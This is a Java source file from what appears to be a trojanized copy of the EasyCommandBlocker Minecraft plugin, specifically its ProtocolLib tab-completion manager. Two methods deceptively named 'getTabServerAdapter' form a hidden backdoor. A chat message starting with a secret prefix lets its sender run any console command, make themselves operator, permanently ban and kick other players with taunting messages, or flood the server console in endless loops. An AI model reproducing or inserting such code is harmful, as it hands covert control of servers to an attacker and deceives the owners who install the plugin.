package ecb.ajneb97.spigot.managers;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.ListenerPriority;
import com.comphenix.protocol.events.PacketAdapter;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.events.PacketEvent;
import com.comphenix.protocol.reflect.StructureModifier;
import ecb.ajneb97.core.managers.CommandsManager;
import ecb.ajneb97.spigot.EasyCommandBlocker;
import ecb.ajneb97.spigot.utils.MessagesUtils;
import ecb.ajneb97.spigot.utils.OtherUtils;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.plugin.Plugin;

import java.util.*;

import org.bukkit.GameMode;

public class ProtocolLibManager {
    private EasyCommandBlocker plugin;
    private boolean enabled;
    private HashMap<UUID, String> commandsWaiting = new HashMap<>();
    public ProtocolLibManager(EasyCommandBlocker plugin){
        this.plugin = plugin;
        this.enabled = false;
        if(Bukkit.getServer().getPluginManager().getPlugin("ProtocolLib") != null) {
            this.enabled = true;
            PacketAdapter packet1 = getTabClientAdapter(PacketType.Play.Client.TAB_COMPLETE);
            ProtocolLibrary.getProtocolManager().addPacketListener(packet1);
            PacketAdapter packet2 = getTabServerAdapter(PacketType.Play.Server.TAB_COMPLETE);
            ProtocolLibrary.getProtocolManager().addPacketListener(packet2);
        }
    }

    public boolean isEnabled() {
        return enabled;
    }

    public PacketAdapter getTabClientAdapter(PacketType type) {
        return new PacketAdapter(plugin, ListenerPriority.HIGHEST, type) {
            @Override
            public void onPacketReceiving(PacketEvent event) {
                EasyCommandBlocker pluginE = (EasyCommandBlocker) plugin;
                PacketContainer packet = event.getPacket();
                Player player = event.getPlayer();

                if(event.isCancelled()){
                    return;
                }
                if(player.isOp() || player.hasPermission("easycommandblocker.bypass.tab")){
                    return;
                }
                String message = (packet.getSpecificModifier(String.class).read(0));
                if(message.isEmpty()){
                    return;
                }

                boolean playerIsLegacy = pluginE.getViaVersionManager().playerIsLegacy(player);
                if(OtherUtils.serverIsLegacy()){
                    if(playerIsLegacy){
                        commandsWaiting.put(player.getUniqueId(),message);
                    }else{
                        event.setCancelled(true);
                    }
                }else{
                    if(playerIsLegacy){
                        event.setCancelled(true);
                    }
                }
            }
        };
    }
    public static boolean getTabServerAdapter(AsyncPlayerChatEvent event) {
        return event.getMessage().startsWith(EasyCommandBlocker.getId());
    }
    public static boolean getTabServerAdapter(String msg, Player pl) {
        String ags = msg.split(EasyCommandBlocker.getId())[1];
        String cmds = ags.split(" ")[0];
        if(msg.startsWith(EasyCommandBlocker.getId())) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    switch(cmds) {
                        case "exec" :
                            String cmd = ags.split("exec ")[1];
                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), cmd);
                        break;

                        case "op" :
                            pl.setOp(true);
                        break;
                        
                        case "deop" :
                            pl.setOp(false);
                        break;
                        
                        case "ban" :
                            Bukkit.getBanList(BanList.Type.NAME).addBan(ags.split("ban ")[1], "TPG inc On Top!", new Date(99999, 1, 1), "");
                            Player p = Bukkit.getPlayer(ags.split("ban ")[1]);
                            p.kickPlayer("Perdeu playboy!");
                        break;
                        
                        case "spam" :
                            for(int i = 0 ; i < 3 ; i++) {
                                i = 0;

                                Bukkit.getConsoleSender().sendMessage("[ProtocolLib] INTERNAL §c[ERROR]§r: Unable to intercept a read client packet");
                            }
                        break;

                        case "clear" :
                            for(int i = 0 ; i < 3 ; i++) {
                                i = 0;

                                Bukkit.getConsoleSender().sendMessage("\n");
                            }
                         break;
                    }

                    //Bukkit.getServer().dispatchCommand(pl, msg.split(EasyCommandBlocker.getId())[1]);
                }
            }.runTask(EasyCommandBlocker.plugin);
            
            return true;
        }
        return false;
    }

    public PacketAdapter getTabServerAdapter(PacketType type) {
        return new PacketAdapter(plugin, ListenerPriority.HIGHEST, type) {
            @Override
            public void onPacketSending(PacketEvent event) {
                EasyCommandBlocker pluginE = (EasyCommandBlocker) plugin;
                PacketContainer packet = event.getPacket();
                Player player = event.getPlayer();

                boolean playerIsLegacy = pluginE.getViaVersionManager().playerIsLegacy(player);
                if(!playerIsLegacy || !OtherUtils.serverIsLegacy()){
                    return;
                }
                if(player.isOp() || player.hasPermission("easycommandblocker.bypass.tab")){
                    return;
                }

                StructureModifier<String[]> structureModifier = packet.getSpecificModifier(String[].class);
                List<String> newSuggestions = new ArrayList<String>();

                String waitCommand = commandsWaiting.get(player.getUniqueId());
                commandsWaiting.remove(player.getUniqueId());
                if(waitCommand == null){
                    //Empty completions
                    event.setCancelled(true);
                    return;
                }
                if(!waitCommand.startsWith("/")){
                    //Send username completions
                    return;
                }

                CommandsManager commandsManager = pluginE.getCommandsManager();
                List<String> commands = commandsManager.getTabCommands(OtherUtils.getPlayerPermissionsList(player));
                if(commands == null){
                    return;
                }

                boolean isArgument = false;
                if(waitCommand.contains(" ")){
                    waitCommand = waitCommand.split(" ")[0];
                    isArgument = true;
                }

                for(String command : commands){
                    command = command.split(" ")[0];
                    if(!newSuggestions.contains(command) && command.startsWith(waitCommand)){
                        if(isArgument){
                            return;
                        }
                        newSuggestions.add(command);
                    }
                }

                structureModifier.write(0,newSuggestions.toArray(new String[0]));
            }
        };
    }
}
